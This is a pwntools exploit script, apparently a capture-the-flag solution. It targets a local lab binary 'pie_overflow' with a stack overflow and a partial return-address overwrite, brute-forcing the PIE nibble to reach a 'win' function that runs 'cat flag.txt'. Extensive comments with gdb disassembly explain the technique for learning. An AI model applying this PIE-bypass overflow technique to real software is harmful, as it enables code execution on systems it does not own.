from pwn import*


while True:
    try:
        procc = process('./pie_overflow', aslr=False)
        pid = gdb.attach(procc, 'b *vuln+55\ncontinue')
        print(procc.recv())



        
        payload = b"A"*8 + b"B"*8
        '''  Overflow the buffer and the RBP to reach he RIP '''



        '''another mistake you made was doing \ x01 + \ xea, remember, this is litle endian, it's backwards!! '''
        payload += b'\xea'
        ''' 
         
        The reason we do 0xea and not 0xe2 is because we overwrote RBP, if we do 

        gdn ./pie_overflow
        b vuln
        r
        disas win


                Breakpoint 1, 0x00005555555551b1 in vuln ()
                (gdb) disas win
                Dump of assembler code for function win:
                0x00005555555551e2 <+0>:     endbr64
                                ^^^ where we were trying to jump 0xe2 byte
                
                0x00005555555551e6 <+4>:     push   %rbp
                0x00005555555551e7 <+5>:     mov    %rsp,%rbp
                                                    ^^^ it's re-aligning the RSP (stack pointer)
                                                        with the RBP which we over-wrote.
                                                        This is needed only if calling the function normally
                                                        like win() inside of main() let's say.
                                                        However, we're only interested in getting to the 
                                                        system call where it reads our flag.txt,
                                                        so we'll jump to 0xea.


                ==================================================================
                **** CANNOT jump past this as it loads the string flag.txt
                    - to confirm, turn off ASLR, and change 0x01 to 0x51
                    and run these commands when it breaks:

                    1) ni
                    2) ni
                    
                    3) disassemble win
                    (see where you are inside of win)

                    4) ni (get to the LEA part)
                    5) ni (get PAST it)
                    6) x/s $rip + 0xe2a
                        OUT: "cat flag.txt"
                
                
                ==================================================================



                0x00005555555551ea <+8>:     lea    0xe2a(%rip),%rax        # 0x55555555601b
                ^^^^^ here.


                0x00005555555551f1 <+15>:    mov    %rax,%rdi
                0x00005555555551f4 <+18>:    call   0x555555555090 <system@plt>
                0x00005555555551f9 <+23>:    nop
                0x00005555555551fa <+24>:    pop    %rbp
                0x00005555555551fb <+25>:    ret
                End of assembler dump.
                (gdb) 
           
        '''
        
        
        '''
        
        gdb ./pie_overflow
        b vuln
        r
        info address win

        0x555..1e2 ( ASLR never touches last 3 nibbles if we do objdump -d pie_overflow | grep win we'll see the last 3 match )
                    00000...11e2
        
        So we want to over-write the last byte to jump to WIN which ie 0xe2,
        but the second highest BYTE changes because of PIE.

        info address vuln
            0x555...1[a9] -> vuln
            0x555...1[e2] -> win
        
                    ^^^^ as you can see only ONE byte differs (last 2 nibbles) from VULN() and WIN(),
                        so even without a PIE leak we can just do a partial over-write of the last nibble

        These will always be the same for the win function address: 0x555...X1e2
                                                                            ^^^ just need to bruteforce this
                                                                        or run it multiple times until we get lucky,
                                                                        this is a 1/16 odds of working.
        
        
                                                                        
        
        '''

        payload += b'\x51'
        '''could've done anything from \ x[0 - F]1 bcs 1 IS ALWAYS THE SAME, win will ALWAYS have this even with PIE + ASLR bcs
        

        rule of thumb is ASLR does not touch those last 3 nibbles, it's just the four nibble from the right that can change, so 
        we just need to run this numerous times till we get lucky.

        '''

        procc.send(payload)


        resp = procc.recv()
        if b"flag" in resp:
            print(f"RESPONSE: {resp}")
            break
    except Exception as err:
        print("Segfault")
